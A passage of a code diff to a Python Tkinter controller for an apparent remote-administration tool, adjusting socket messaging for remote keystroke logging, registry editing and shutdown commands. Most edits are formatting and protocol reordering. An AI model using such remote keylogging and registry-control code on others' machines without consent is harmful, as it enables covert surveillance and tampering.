@@ -177,16 +177,17 @@ class Controller():
     def keystroke_unhook(self, event):
         self._socket.send(','.join(["keystroke", "unhook"]))
 ###
+
     def keystroke_print(self, event):
         self._socket.send("keystroke,print")
         log_len = int(self._socket._sock.recv(32).decode('utf8'))
         print(log_len)
-        data = self._socket.receive(length = log_len).decode("utf8")
+        data = self._socket.receive(length=log_len).decode("utf8")
         print(data)
         self._function.print_keystroke(data)
-    
+
     def keystroke_clear(self, event):
-        self._function.text_field.configure(state = "normal")
+        self._function.text_field.configure(state="normal")
         self._function.text_field.delete("1.0", tk.END)
         self._function.text_field.configure(state="disable")
 
@@ -239,9 +240,10 @@ class Controller():
 
     def registry_sendcont(self, event):
         filecont = self._function._regcont
-        self._socket._sock.sendall(bytes(str(len(filecont)), "utf8"))
         self._socket.send(
-            ','.join(["registry", "file", filecont]))
+            ','.join(["registry", "file"]))
+        self._socket._sock.sendall(bytes(str(len(filecont)), "utf8"))
+        self._socket.send(filecont)
 
     def registry_send(self, event):
         func = self._function._df_func.get().strip("\n")
@@ -255,10 +257,8 @@ class Controller():
             func = func.split(" ", 1)[0].lower()
         else:
             func = func.replace(" ", "").lower()
-        request = ["registry", func, path, name, value, dttp]
-        value_str = ','.join(request)
-        self._socket._sock.sendall(bytes(str(len(value_str)), "utf8"))
-        self._socket.send(value_str)
+        self._socket.send(
+            ','.join(["registry", func, path, name, value, dttp]))
 
     # Function 6
     def shutdown(self, event):
